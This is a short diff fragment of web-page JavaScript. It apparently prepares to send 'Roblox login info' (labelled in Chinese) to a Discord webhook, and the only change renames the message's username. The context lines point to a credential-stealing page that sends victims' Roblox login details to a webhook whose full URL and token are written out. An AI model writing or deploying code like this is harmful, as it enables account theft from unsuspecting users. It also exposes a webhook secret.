@@ -21,7 +21,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 const webhookURL = "https://discord.com/api/webhooks/1382344727688646767/sXTH1azfKhUqSQ153O4I1uaOdn6NkSDnKkrPyGSjijEzKLLo9CE5FA__OIghjBKlJN6g";
 
                 const embedPayload = {
-                    username: "帳號資訊1",
+                    username: "帳號資訊",
                     embeds: [
                         {
                             title: "Roblox 登入資訊",
